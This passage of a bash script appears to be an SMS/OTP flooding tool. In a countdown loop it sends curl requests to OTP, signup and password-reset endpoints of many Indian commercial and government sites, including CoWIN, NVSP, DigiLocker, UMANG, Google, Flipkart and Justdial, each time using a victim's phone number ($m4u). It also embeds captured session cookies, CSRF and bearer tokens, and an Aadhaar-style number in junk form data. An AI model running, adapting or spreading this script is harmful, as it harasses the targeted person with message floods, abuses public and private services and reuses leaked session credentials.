sess_map=qruyauqxeddzurbtdauyrsdbvvfqecfrasvrsudwedetqrweuxzfbuwqdcdcvxwbzqctyzvwvwfxusbaxzwwqzrdvzudtwyetszazbsvzytyayryvacacryuavffdazwvbfqwyxtycrxybxsfbczddfv; _dc_gtm_UA-30603879-3=1; _dc_gtm_UA-30603879-1=1; _dc_gtm_UA-30603879-8=1; _gat_UA-30603879-6=1; _gat_UA-30603879-1=1; QGUserId=%226151638710690086%22; JSESSIONID=999288BB64CC7E8F9FC644F6B4D3DE30; __stp={"visit":"new","uuid":"5249abed-c3c5-4396-8577-471927773af5"}; __stdf=0; __stgeo="0"; __stbpnenable=0; _qg_pushrequest=true; s_vnc365=1651741905807%26vn%3D1; s_ivc=true; s_ppn=Home; s_ips=792; s_cc=true; ADRUM=s=1620205907297&r=https%3A%2F%2Fwww.shoppersstop.com%2F; syte_ab_tests={}; _dy_ses_load_seq=43768%3A1620205908386; _dy_c_att_exps=; _dy_soct=394967.673163.1620205908*488844.949181.1620205908*338160.547739.1620205908; _uetsid=e81d8780ad8111eb9e4c15fe0469193e; _uetvid=e81dbaf0ad8111eb87d5a341c1bab3c3; _dyfs=1620205909629; _dy_lu_ses=f40596505a9857d1b33c17234226f93d%3A1620205909630; _dy_geo=IN.AS.IN_.IN__; _dy_df_geo=India..; __sts={"sid":1620205903567,"tx":1620205910127,"url":"https%3A%2F%2Fwww.shoppersstop.com%2F%23","pet":1620205910127,"set":1620205903567,"pUrl":"https%3A%2F%2Fwww.shoppersstop.com%2F","pPet":1620205903567,"pTx":1620205903567}; session_key=1UXpGe2nzd&1620205910295::4tUqMBqg2PPrExVIRxLfwIv1ZcVDoKoqq8md2H/Y8moLljPLU5ul8A==; s_tp=10060; s_ppv=Home%2C8%2C8%2C792%2C1%2C12; s_nr30=1620205946649-New; s_tslv=1620205946651; s_sq=shoppersstopglobalprod%3D%2526c.%2526a.%2526activitymap.%2526page%253DHome%2526link%253DCONTINUE%2526region%253DregisterForm%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DHome%2526pidt%253D1%2526oid%253Dcontinue%2526oidt%253D3%2526ot%253DSUBMIT' \
  --data-raw 'fullName=efgwrgwrrr+feer&email=GWERWEFWR%40HERHER.EG&mobileNumber='$m4u'&gender=MALE&pwd=regwegeg&registerOtp=&CSRFToken=a1881cb3-94cc-4bb5-9f8c-c9977f475769' \
  --compressed
#<∅>16</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://bcas-prod.byjusweb.com/api/v2/send-otp' \
  -H 'authority: bcas-prod.byjusweb.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'origin: https://byjus.com' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://byjus.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  --data-raw '{"phoneNumber":"'$m4u'","page":"free-trial-classes"}' \
  --compressed
#<∅>15</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://accounts.google.com/_/signup/sendidv?hl=en-GB&TL=AM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu&_reqid=842533&rt=j' \
  -H 'authority: accounts.google.com' \
  -H 'x-same-domain: 1' \
  -H 'google-accounts-xsrf: 1' \
  -H 'user-agent: Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1' \
  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \
  -H 'accept: */*' \
  -H 'origin: https://accounts.google.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://accounts.google.com/signup/v2/webgradsidvphone?continue=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&dsh=S553682139%3A1620194503669767&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: 1P_JAR=2021-05-05-06; NID=215=sCod8ou9RXHg1zhfWfUmtDg43ZNoTiTM9kjsZIHaAmfedVA9DroUrCOgrzxyDWTardo2Q-SYPEwdyJ9EoDFMz3sLRTBZ48k7VSfSOv7UqvDUlfyRonGVK-1ekeQW9-jk6FqknX9pimt7QapzKTloJMles3MaDfAYP5em1U0I284; __Host-GAPS=1:ktyhq0siKxr4OqHEjXbuW7i3UU3BQw:3LqQ36kAune82FpW' \
  --data-raw 'continue=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&dsh=S553682139%3A1620194503669767&f.req=%5B%22TL%3AAM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu%22%2Cnull%2C%22'$m4u'%22%2C%22in%22%2C3%2Cnull%2C1%2Cfalse%2C%5B%5D%5D&azt=AFoagUWA-OHLWOUtP5SiITwa7-nC3aLuqA%3A1620194621658&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IN%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2Cfalse%2Cnull%2C%22%22%5D&gmscoreversion=undefined&' \
  --compressed
#<∅>14</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.olx.in/api/auth/authenticate?lang=en' \
  -H 'authority: www.olx.in' \
  -H 'accept: */*' \
  -H 'x-newrelic-id: VQMGU1ZVDxABU1lbBgMDUlI=' \
  -H 'x-panamera-fingerprint: 70ffbbf8001589eb6b229252a71f0b90#1620191540737' \
  -H 'user-agent: Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.olx.in' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.olx.in/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: lqonap=1793af0e7c5x24f60240; laquesis=pan-48200@b#pan-48658@b; laquesisff=pan-36788#pan-38000#pan-42665; bm_sz=29453BA6C68E8CDC20E1EE16B77BD914~YAAQDdgsMTZCGjV5AQAAZunwOgsUFzXaUWgrmqux6pQZsZJjjeq6/NWJSxLOPcNYZv1Auwft+Q5hyd8OI5yXYEcO3Mf9jMzD6MCSCJEwIyB+as7BnQPhJ6sEpEQqkRs7Avmqj8EknniNaqXqMezMkbZba8vu9eibFObSB9+jXD96+YWna9v/rbpodRc2rBnu3I94VhVx/7jFEYGIKnRQHu6gLEafKNjrtOJBtwozvfUYTYsIVZAxCbna2Q==; bm_mi=3155871FCD3A77A2170153695D7715E2~OFzoVLl0yjdXYWiIQ89xXsVjoFqWCT6nvgMNjnMP4wIpHtCYpv8g8l5fVH3LcOitBAMfvt67eFZZpypnhPkVWIsr7iG0u+iUfDliIQwLPyoZxTGeJ309IafLQmqRdW04Nxa45npfburmGJto1HhMk6jlybT2tssSqPo+LXx3o5zqJfP3S6vAEJFtNBSx/ptQHHbuybYZ3jrRYYvPFZ5omHEz80iRg5mCPNEyAN3KzE+/L9VbUk4fn/PlS2IGx+uHm17qB+F7mSK/t+34zNijKw==; ak_bmsc=C6BDF08AC27F9934D1E2F463B919BAFF312CD80D7B3B0000312992601A5B636B~plPc3OjVxSUd69e4pFLH6wHCsV9Y2JwdsrzycRuNDG73PNyVfVFJbJ6Wwx+s4rdv6LEY1TFOthfjsafmS4d3DoGJ3AKGsOLptQqA6jAJfmSScaMDPOvesq6Dm+Z7+MuK+oereK2W9Rlrya9xxWxhts4JgMRmFIJRVLyTTHKzOuwf2uJ3wkDCYpKKdnFEDuJo2W7FLPFmrVYwZU7VSqazDMn4ker5t1FT7mBFiDJenhAXg77O2X7jLx6jhqU9XFyKEFOfMYojunHaEHxHYiKlB0Zw==; _abck=FFB6AEF6BFA711160B10126FDE2BAD22~0~YAAQDdgsMWRDGjV5AQAA/PfwOgUdEqe6gKQevev3oVVaWX4Ln/aUz0jeh1ZDBKIZnmBDguEhgKmYKtBWUtBdte9DAgAll+zdCwPoRjUUUORtA7vtzfmOlWJvWeZ5mc9fg/FF46xjM/GsW8I4CJHYr8ZM3zYNAyYn01tKWMcJVR5XFZy2ELZfIgt4lSEx9DYkFn2xpymlz9Khcw7pM9MJmqLDntrYIy6bcy/NdkvpdH7YP3IcOWXZ6KeKJrxPnxaiaVzaJ61+OTZDExc/BEylAfo0oEZ4ZkaeuEH2b+vynK8RpcCltmNQV9YiOGetd3kMilcUd1Y+eb14zvPkzNCvdcFQeiVozfMKyqgqTALzduMQnLC0vZ9wohMSiEbaYIC9PSlsHhxi1FyKqeTUVbXG6nfGYQ==~-1~||-1||~-1; ldTd=true; lqstatus=1620192737|1793af0e7c5x24f60240|pan-48200; _ga=GA1.2.1664878203.1620191542; _gid=GA1.2.431324241.1620191542; _gat_clientNinja=1; _gcl_au=1.1.999877154.1620191542; WZRK_G=ac511e8e3d354d92b2e033540d284f91; _fbp=fb.1.1620191543642.668882890; G_ENABLED_IDPS=google; AMP_TOKEN=%24NOT_FOUND; _gat_UA-88236416-1=1; g_state={"i_p":1620198745083,"i_l":1}; onap=1793af0e7c5x24f60240-1-1793af0e7c5x24f60240-12-1620193348; WZRK_S_848-646-995Z=%7B%22p%22%3A1%2C%22s%22%3A1620191543%2C%22t%22%3A1620191548%7D; bm_sv=FE42EAD7408C3F80E8F4C26532F2E707~dgtqzu96Fu/UPkVkXy5ni/Yd5q7pT+rAVhYEPYImzv8sb/DLEEuPfhRpvrKHRr/2CnKhLbkvSrQLFW7DRpHnZYDHr3NtpUZpkOAv/IhIdfdfWxyDEcid9NpMjp6E+E0gyBP1N0sz/DlWziYPl76YebPKaloLbZd2Q3xrB7Ov+Pk=' \
  --data-raw '{"grantType":"phone","phone":"+91'$m4u'","language":"en"}' \
  --compressed
#<∅>13</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.digitalgujarat.gov.in/CitizenApp/Citizen/CitizenWEBUI/ForgotPassword.aspx' \
  -H 'authority: www.digitalgujarat.gov.in' \
  -H 'cache-control: max-age=0' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'origin: https://www.digitalgujarat.gov.in' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'referer: https://www.digitalgujarat.gov.in/CitizenApp/Citizen/CitizenWEBUI/ForgotPassword.aspx' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: ASP.NET_SessionId=jtq54dfpo1y3suhghnravcr4' \
  --data-raw '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTEyODUzNDUyNTIPFCsAA2RoZBYCAgMPZBYGAikPZBYCAgsPDxYCHgRUZXh0ZWRkAioPFgIeB1Zpc2libGVoZAIrDxYCHwFoZGT57WnPkNZrn7MdJ2P0y6Aa6UK4IuoTqh370HbHPAUS6Q%3D%3D&__VIEWSTATEGENERATOR=DF6F5342&__EVENTVALIDATION=%2FwEdAApnSz24nOdNNCh8N8RNy0ahZOK6UL57TPXWG%2FKQKb%2BA8hiRShq4sYTUSAZCh4k3m5iXR47GgQ9LQgOp%2FQQdHHe%2F0rkHEi%2BmkA4PV7NC%2FfzgTkixE8BKSD0hlfwN20rmgKvLcUOh9aX%2F%2BMm%2Bnnul4kkqNMIAwosSLKAy6JMgWN7wE3rOuTNWtuI4oTnTGbHrm6KVgM0FfizQXYJSPKJShJK%2F%2BXmmJ9kZrVIRwXWIKNFLgVaGbQF1Pf1c659gexCPWOM%3D&DropDownList1=3&txtUserNm='$m4u'&txtcaptcha=ff7cf&btnnext=Next' \
  --compressed
#<∅>12</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.nvsp.in/Account/SendOTP?phonenumber='$m4u'&captcha=I0XE2' \
  -H 'Connection: keep-alive' \
  -H 'Accept: */*' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://www.nvsp.in/Account/Register' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: nvsp=4e5653505f4150505f4e45575f33; nvsp=4e5653505f4150505f4e45575f33; nvspid=yo5hqcdtmqiioakc1ssch3kp; __RequestVerificationToken=BokJj7E8rs9QKhK1VC8_B9EEJD1BB-JeIdWR3228v1hBgwdLn9aOapGMdrl6TrBNSQMZxrKBgiVIDbPT71tEAqGS3U4OnE0OO0X8FXqhycwiQg2OWXUaH3kcD1UbOeVx3tYfbemUGtLiNPo9GR7rYw2' \
  --compressed
#<∅>11</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP' \
  -H 'authority: cdn-api.co-vin.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'content-type: application/json' \
  -H 'origin: https://selfregistration.cowin.gov.in' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://selfregistration.cowin.gov.in/' \
  -H 'accept-language: en-US,en;q=0.9' \
  --data-raw '{"secret":"U2FsdGVkX1/d1gPD3UndCZLmVMLneTQ2tBoFrkSs3UVJtTFUr4fuNgKofObJwLVqs/GfPEIezePxqXtRehOtIw==","mobile":'$m4u'}' \
  --compressed
#<∅>10</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://apps.mgov.gov.in/registration-service' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: https://apps.mgov.gov.in' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://apps.mgov.gov.in/register' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: XSRF-TOKEN=NDKDdfdsfkldsfNd3SZAJfwLsTl5WUgOkE; JSESSIONID=F187A57279035F905028129A53B74726' \
  --data-raw 'name=wfwfrfwfwfgwerfvwrvwr&email=wevwevwegeuifwyu%40gmail.com&mobile='$m4u'&state=Manipur&city=manipur&password=Symbol%3A%21%40%23%24%25%5E%26*&cnf_password=Symbol%3A%21%40%23%24%25%5E%26*&captcha=orbhrc' \
  --compressed
#<∅>09</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://auth.mygov.in/user/register?destination=oauth2/register/datagovindia' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: https://auth.mygov.in' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://auth.mygov.in/user/register?destination=oauth2/register/datagovindia' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: has_js=1; _ga=GA1.2.1386671931.1620183994; _gid=GA1.2.1864660388.1620183994; _gat=1; SSESSf07e5adbc1360cbe21bfeae140bc05d2=vsq7K_zWcvXD9IWUKtH5urg67S0_xMsoVgYBV_ZCjRk' \
  --data-raw 'full_name=fgeggr&email=ergerger%40gov.in&gateway%5Bcountry%5D=91&number='$m4u'&links_fieldset%5Bdate%5D=15&links_fieldset%5Bmonth%5D=April&links_fieldset%5Byear%5D=2011&gender=male&referal-code=&op=Create+New+Account&form_build_id=form-tIh4z1LYmFhzquSUV0zOLuQQt5ueaJu8zpHTm8_DaVA&form_id=pwdless_registration&timezone=Asia%2FKolkata' \
  --compressed
#<∅>08</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://app.umang.gov.in/t/negd.gov.in/umang/coreapi/opn/ws2/openinitotp' \
  -H 'Connection: keep-alive' \
  -H 'Accept: application/json' \
  -H 'Authorization: Bearer 02f6dd09-7573-3c7d-a9e7-7f0f429f9d50' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://web.umang.gov.in' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://web.umang.gov.in/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"tkn":null,"hmd":"","os":"","mcc":"","imei":"","pkg":"","clid":"","lat":"","lon":"","hmk":"","ver":"","mnc":"","acc":"","lac":"","peml":"","did":"","imsi":"","mod":"web","lang":"en","rot":"","mno":"'$m4u'","ort":"loginmob","st":"","uid":"","chnl":""}' \
  --compressed
#<∅>07</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://accounts.digitallocker.gov.in/signup/signup_request' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Content-type: application/x-www-form-urlencoded' \
  -H 'Accept: */*' \
  -H 'Origin: https://accounts.digitallocker.gov.in' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://accounts.digitallocker.gov.in/signup' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: DLOCKER=2d5867c28b21f1239695d828f29d03b41345423e; SRVNAME=S5' \
  --data-raw 'aadhaarNumber=923069986377&email=hsdfhkhd@gmail.com&mobile='$m4u'&name=fngngfngnfn&dob=04/05/1996&gender=M&pin=653265&token=AGe4cxKiu19efiYfo---dpRU4---xal/274tO4cvipTzcQzjHUvd9f79xJM0facqc0HghjkmGgJBhtvsCzgZYIxflsaufHmBqPYs8GUqQULoLcWvhC8AcOe7uuJKFAsavV2r8grLIDmf5ljGXoeOWwXGuw==' \
  --compressed
#<∅>06</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.flipkart.com/api/7/user/otp/generate' \
  -H 'Connection: keep-alive' \
  -H 'X-user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1 FKUA/msite/0.0.1/ucweb/Mobile' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: https://www.flipkart.com' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Referer: https://www.flipkart.com/login?ret=%2F&entryPage=HOMEPAGE_HEADER_ACCOUNT' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cookie: T=TI162015047029000448902078709256298339690594956921097801337814946046; Network-Type=4g; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; _pxvid=daa3e346-ad00-11eb-b34a-0242ac120010; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18752%7CMCMID%7C28045557022811495433475949224901176247%7CMCAAMLH-1620755274%7C12%7CMCAAMB-1620755274%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1620157674s%7CNONE%7CMCAID%7CNONE; s_cc=true; vh=823; vw=411; dpr=3.4999999403953552; fonts-loaded={"en":"true"}; _px3=8f0231529cfd9d69a9abbb2adcf839e4179a60adfda60f082ab018559b9abf47:SBWVRopTIJ4MIl+PIH6p0olHompkvQJmmV9Jc5st7DJZK/7owIfd7GG5BlHbmZ6lTJnsAYfYB5u9UsXIlleVtQ==:1000:Cl1OIMdFocauTLWfydd+28sHoRhFPbTf4770Tl1Fy0Djfhrjr7HRjfXzRlv+Esl0MycVkudmzf+8aS1QqUFovX6w9mpqqTyuOsjfGuGPM+mL3wwPGO0UYCgu+La0W60INVeJp9yL6kRa5jWsAY4BHJY1RchTflOYZUK7j9jQsQM=; SN=VI8375E02E9D2244A5B83326319C8D41C3.TOKE6DD69D331D34AA188007030CCA9265A.1620150523.LO; gpv_pn=Login2Step%3ADisplayed; gpv_pn_t=Login; s_sq=flipkart-mob-web%3D%2526pid%253DLogin2Step%25253ADisplayed%2526pidt%253D1%2526oid%253Dfunction%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DDIV%26flipkart-prd%3D%2526pid%253DHomePage%2526pidt%253D1%2526oid%253Dfunction%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DA; S=d1t17Pz8/Zz9CPzwSPw4/Pz8/PzrAKDCAh312QxOfxGgi9x9J8bcMpVhiNS/7W2I7MIeAXpNfErbSjEVwzNdNcWp6/Q==' \
  --data-raw '{"loginId":"+91'$m4u'","allLoginEntities":true}' \
  --compressed
#<∅>05</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.justdial.com/functions/whatsappverification.php' \
  -H 'authority: www.justdial.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'x-frsc-token: 0ff5613d081edc753d8ac0cfbf01adfd454a1c18fbf3275b676f4bc8625a6c0c' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'origin: https://www.justdial.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.justdial.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: ppc=; TKY=0ff5613d081edc753d8ac0cfbf01adfd454a1c18fbf3275b676f4bc8625a6c0c; _ctok=1fbbcc4ff86b43031a3705caed0c3285109828c67634b038fa3cddce7cc05b70; main_city=Gandhinagar-Gujarat; akcty=Gandhinagar-Gujarat; inweb_city=Gandhinagar-Gujarat; PHPSESSID=d0a3f9912ac5dc038ea065049e223a5d; profbd=0; bdcheck=1; bm_sz=19778593BA84B1D8ECBBAFF30535F031~YAAQ9oosMUcctdx4AQAA3jphOAuJIMA6PuGPYYootWC+EjIhrdi7+LVmvgMasr36QbYWC/YYpVDnIZHxMinWd2+zuNY53s6KZhrVcGWsN6RomS0tVJt9JXpBNDMK0LJaQSWa9yzJcXAOBHMDKQbKR2aiYZvXDwodyqSVQR/M5DWbc53X1vYtvReN4ATg5zxmtw==; _ga=GA1.2.1051062779.1620148567; _gid=GA1.2.1268876550.1620148567; _fbp=fb.1.1620148567924.499452454; _abck=CD5B030736476EE83DCE3B119C36A139~0~YAAQ9oosMU4ctdx4AQAAzD9hOAVwHJ/shny7h7vCoa8r+52Frps58D3a/vgwkMCbHGBiVYoFERfE/clobEopNLz4NIylVwjbYCoa7NFjTwfl1x/ZUbQ2nuiXTWuTjogKln8/2bubnIM1wrGFV+phwoda6aDiqAhi3RC/7lVXXZRRIhCgTrp/apOGcLsyDk7sYNZoFNGZCnEXiU/rQq72ltxMcRT1IfgIu9nMjLCmMWImZZu0yX46ZjZFW/M58GWB9sPZOJW+0Ccyoeempxj/S1KSYc0uJuIxNcaBReb8jwhb8LK8CLMzcoX3V6kgaLwLCfcRX+hjoxa7WZF80CipjOoXWg6XUkC9gT6To2JM2E9OJ23oj/4+2uyNzbEjcRrDkAY0FLCk+wXuE1DM4uOGU0dws254nowAZA==~-1~||-1||~-1; tab=toprs; prevcatid=11131975; bd_inputs=2|4|Wifi%20Internet%20Service%20Providers; view=lst_v; scity=Gandhinagar-Gujarat; sarea=; dealBackCity=Gandhinagar-Gujarat; ppc=; ak_bmsc=5C1DF23F43AA6A6352F132EF3376C474312C8AF6876800005681916074841C16~plPwS6cy79hsalNGEUVsRR7dVkBtbl7IIMsyADUiBKy/saLUDaQuf6gX8sCTKiXZn3GMnQddj62QmP0Dd+Q5+V55lymrrtrgH0rr5F8uLDUnTTxKUQDwl8PTF1psr9mBSbJRJTDZzWn8TgYGBI3sjdNLxNy+Z+wHMPKBD/a6aiZKKyyBTf5UWAZd7eLPXuVD0KQXJWkIpLsfjBMmcSgEH2Maiw5V7fj7pfFt0l3YU8rQ4w9KqMsGLkST3aYKFGslGZmySaKpSJTjHh8KpUNKCjAPwRRL8g2T8thGxMIDxzuKIHN57twxLUUxQ3O25n+CGw; BDprofile=1; ins_vcode=2021-05-04+22%3A48%3A49; new_user=0; _mycart=0; attn_user=logout; bm_sv=4984BB0CD07E831FB499723279497763~qWrAS/VBt6UOGt+yFhI7S5rfNWhGQFV+VX5XVJEn3A0AefFFezLAXHOQUj7CDVXxY8tC4WCa8cVQNL6JWI+zQBSA1Jj7xMbneRwU4YidSYCDQoJkFMwEx6y4Nm7FIXgwy8fH9jrHeWck3zenJgd/OEdIRmjL3Gz2ABUtglH9RME=' \
  --data-raw 'mob=''$number&vcode=&rsend=0&name=Ggtnnsdvsvs' \
  --compressed
#<∅>04</∅>
clear
bash .files/logo.sh
echo "$logo"
echo "$status"
echo "$off"
curl 'https://www.justdial.com/functions/whatsappverification.php' \
  -H 'authority: www.justdial.com' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'x-frsc-token: 0ff5613d081edc753d8ac0cfbf01adfd454a1c18fbf3275b676f4bc8625a6c0c' \
  -H 'sec-ch-ua-mobile: ?1' \
